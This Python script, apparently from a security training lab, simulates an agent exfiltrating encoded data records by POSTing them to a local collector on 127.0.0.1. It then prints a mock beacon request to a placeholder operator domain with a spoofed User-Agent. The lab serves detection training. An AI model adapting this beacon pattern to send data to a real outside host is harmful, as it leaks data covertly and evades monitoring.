"""Send the variants to the collector, the way an agent would.

    python beacon.py --all       send every variant in variants.json
    python beacon.py --plain     send only the untouched record

It starts collector.py itself, waits for the port, POSTs each variant, and stops
the collector again. Nothing is left running between commands - the same shape
lab 6 used, and it means a failed step cannot leave a process behind to confuse
the next one.

If a collector is ALREADY listening - expert mode starts one by hand - it uses
that one and leaves it running. It only ever stops a process it started itself.

Everything is on 127.0.0.1 inside this container. The container has no network.
"""
import argparse
import json
import pathlib
import socket
import subprocess
import sys
import time
import urllib.error
import urllib.request

WORK = pathlib.Path("/labs/lab7")
VARIANTS = WORK / "variants.json"
LOG = WORK / "collector.log"
ENDPOINT = "http://127.0.0.1:8007/checkin"


def wait_for_port(host, port, timeout=10.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        with socket.socket() as s:
            s.settimeout(0.4)
            if s.connect_ex((host, port)) == 0:
                return True
        time.sleep(0.1)
    return False


def send(name, source, text):
    req = urllib.request.Request(
        ENDPOINT, data=text.encode(),
        headers={"Content-Type": "text/plain",
                 "X-Lab-Variant": name,
                 "X-Lab-Source": source})
    with urllib.request.urlopen(req, timeout=10) as r:
        return r.status


def real_attacker_note(count, total_bytes):
    """The parked-decision answer: say what egress WOULD have looked like.

    Decided 2026-09-13 and closed permanently. The lab shows the shape of the
    request a real operator's endpoint would have logged, and stops there.
    """
    print()
    print("=" * 68)
    print(" WHAT A REAL OPERATOR'S ENDPOINT WOULD HAVE RECEIVED")
    print("=" * 68)
    print()
    print("   POST /api/v2/telemetry HTTP/1.1")
    print("   Host: <a domain the operator registered last week>")
    print("   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    print("   Content-Type: application/json")
    print(f"   Content-Length: <one of {count} shapes, {total_bytes} bytes total>")
    print()
    print(f"   {count} check-ins, from one workstation, to one host that")
    print("   nothing else in the estate has ever contacted.")
    print()
    print("   This lab stops here on purpose. It never leaves your machine, and")
    print("   the reason is not squeamishness: a work laptop that runs a hacking")
    print("   lab and then beacons on a timer to an unfamiliar domain is the")
    print("   textbook EDR detection. Doing it for real would page your SOC.")
    print()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--all", action="store_true", help="send every variant")
    ap.add_argument("--plain", action="store_true",
                    help="send only the untouched record, three times")
    args = ap.parse_args()

    if not args.all and not args.plain:
        ap.error("choose --all or --plain")

    if args.all and not VARIANTS.exists():
        print("No variants yet. Generate them first:")
        print("    python variants.py --formats json,csv,kv,xml,urlq")
        print("    python variants.py --encode base64,hex")
        return 1

    if args.plain:
        rec = (WORK / "record.txt").read_text().strip()
        queue = [("plain", "none", rec)] * 3
    else:
        store = json.loads(VARIANTS.read_text())
        queue = [(n, v["source"], v["text"]) for n, v in store.items()]

    # A fresh log per send, so a re-run cannot double-count.
    if LOG.exists():
        LOG.unlink()

    print("=" * 68)
    print(" SENDING TO THE COLLECTOR")
    print("=" * 68)
    print()
    # A collector may already be running - expert mode starts one by hand. Without
    # this check we would start a second one, it would fail to bind silently, and
    # wait_for_port would see the FIRST one: everything appears to work, which is
    # worse than failing. Found while testing 2026-09-13.
    already = wait_for_port("127.0.0.1", 8007, timeout=0.5)
    proc = None
    if already:
        print("   a collector is ALREADY listening on 127.0.0.1:8007")
        print("   using it rather than starting a second one, and leaving it")
        print("   running when this finishes - it is yours, not mine.")
    else:
        print("   starting collector.py on 127.0.0.1:8007 (loopback, not published)")
        proc = subprocess.Popen([sys.executable, str(WORK / "collector.py")],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        if not wait_for_port("127.0.0.1", 8007):
            if proc:
                proc.terminate()
            print()
            print("   The collector did not come up on 127.0.0.1:8007.")
            print("   Nothing is broken on your machine - this is inside the")
            print("   container. Tell the instructor and send lab7-results.txt.")
            return 1
        print("   collector is up")
        print()
        total = 0
        for name, source, text in queue:
            try:
                code = send(name, source, text)
            except (urllib.error.URLError, OSError) as e:
                if proc:
                    proc.terminate()
                print(f"   could not send {name}: {e}")
                return 1
            total += len(text.encode())
            tag = "MODEL " if source == "model" else (
                  "python" if source == "python" else "  --  ")
            print(f"   {code}  {tag}  {name:<8} {len(text.encode()):>4} bytes")
    finally:
        # Only stop a collector we started. An expert's own process is theirs.
        if proc:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()

    lines = LOG.read_text().splitlines() if LOG.exists() else []
    print()
    print(f"   collector.log now has {len(lines)} entries, {total} bytes of body.")
    print("   The detector reads that log. It never sees variants.json - a")
    print("   defender does not get the attacker's working files.")
    real_attacker_note(len(lines), total)
    return 0


if __name__ == "__main__":
    sys.exit(main())
